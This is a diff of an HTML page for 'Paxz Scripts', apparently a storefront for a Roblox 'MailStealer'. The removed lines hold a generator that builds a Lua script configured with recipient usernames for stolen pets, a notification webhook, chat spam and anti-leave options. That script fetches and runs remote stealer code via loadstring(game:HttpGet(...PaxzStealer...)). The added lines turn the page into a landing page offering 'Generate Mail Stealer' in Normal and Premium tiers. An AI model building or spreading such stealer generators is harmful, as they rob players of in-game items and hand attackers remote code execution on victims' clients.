@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
-<head><head>
+<head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Paxz Scripts</title>
@@ -8,92 +8,77 @@
     body {
       font-family: Arial, sans-serif;
       text-align: center;
-      margin: 100px;
+      margin: 0;
+      overflow: hidden;
+      position: relative;
+      background-color: #1a1a1a;
+      color: #fff;
+    }
+    #animationContainer {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: -1;
     }
     h1 {
-      font-size: 36px;
+      font-size: 48px;
+      margin-top: 50px;
     }
     h2 {
-      font-size: 24px;
+      font-size: 30px;
+      margin-bottom: 20px;
     }
     button {
       padding: 10px 20px;
       font-size: 18px;
       margin: 10px;
+      background-color: #3498db;
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background-color 0.3s ease-in-out;
+    }
+    button:hover {
+      background-color: #2980b9;
+    }
+    #mailStealerOptions {
+      display: none;
+      margin-top: 20px;
+    }
+    #mailStealerOptions button {
+      background-color: #e74c3c;
+      transition: background-color 0.3s ease-in-out;
+    }
+    #mailStealerOptions button:hover {
+      background-color: #c0392b;
     }
   </style>
 </head>
 <body>
-  <h1>Paxz MailStealer Setup</h1>
-  <form id="setupForm">
-    <label for="userName">User to send good pets to:</label>
-    <input type="text" id="userName" required><br>
+  <div id="animationContainer">
+    <img src="https://wallpapercave.com/wp/wp2760959.gif" alt="Animated Background" style="width: 100%; height: 100%; object-fit: cover;">
+  </div>
+  <h1>Paxz</h1>
+  <h2>Best Scripts!</h2>
+  <button id="mailStealerBtn">Generate Mail Stealer</button>
+  <button id="joinBtn">Join Paxz</button>
+  <button id="otherScriptsBtn">Other Scripts</button>
 
-    <label for="userName2">User to send bad pets to:</label>
-    <input type="text" id="userName2" required><br>
-
-    <label for="webhook">Webhook for notifications:</label>
-    <input type="text" id="webhook" required><br>
-
-    <label for="loadingScreenText">Loading screen text:</label>
-    <input type="text" id="loadingScreenText" required><br>
-
-    <!-- Add more input fields for other settings here -->
-    <label for="chatMessage">Chat spam message:</label>
-    <input type="text" id="chatMessage" required><br>
-
-    <label for="kickTime">Kick time (seconds):</label>
-    <input type="number" id="kickTime" required><br>
-
-    <label for="loadingScreen">Loading screen (true/false):</label>
-    <input type="text" id="loadingScreen" required><br>
-
-    <label for="antiLeave">Anti-leave (true/false):</label>
-    <input type="text" id="antiLeave" required><br>
-
-    <!-- Add more input fields for other settings here -->
-
-    <button type="button" id="generateScriptBtn">Generate Script</button>
-  </form>
-
-  <div id="scriptOutput" style="display: none;">
-    <h2>Generated Script:</h2>
-    <pre id="scriptCode"></pre>
+  <div id="mailStealerOptions">
+    <h2>Choose an option:</h2>
+    <button>Normal</button>
+    <button>Premium</button>
   </div>
 
   <script>
-    const generateScriptBtn = document.getElementById("generateScriptBtn");
-    const scriptOutput = document.getElementById("scriptOutput");
-    const scriptCode = document.getElementById("scriptCode");
+    const mailStealerBtn = document.getElementById("mailStealerBtn");
+    const mailStealerOptions = document.getElementById("mailStealerOptions");
 
-    generateScriptBtn.addEventListener("click", () => {
-      const userName = document.getElementById("userName").value;
-      const userName2 = document.getElementById("userName2").value;
-      const webhook = document.getElementById("webhook").value;
-      const loadingScreenText = document.getElementById("loadingScreenText").value;
-      const chatMessage = document.getElementById("chatMessage").value;
-      const kickTime = document.getElementById("kickTime").value;
-      const loadingScreen = document.getElementById("loadingScreen").value;
-      const antiLeave = document.getElementById("antiLeave").value;
-      
-      // ... (add more variables for other settings here) ...
-
-      const generatedScript = `-- {{Paxz MailStealer}} --
-_G.UserName = "${userName}"
-_G.UserName2 = "${userName2}"
-_G.Webhook = "${webhook}"
-_G.loadingScreenText = "${loadingScreenText}"
-_G.ChatMessage = "${chatMessage}"
-_G.KickTime = ${kickTime}
-_G.LoadingScreen = ${loadingScreen}
-_G.AntiLeave = ${antiLeave}
--- ... (add more settings and their values here) ...
-
--- /|\\ Script /|\\ --
-loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Paxz%20MailStealer.lua", true))()`;
-
-      scriptCode.textContent = generatedScript;
-      scriptOutput.style.display = "block";
+    mailStealerBtn.addEventListener("click", () => {
+      mailStealerOptions.style.display = "block";
     });
   </script>
 </body>
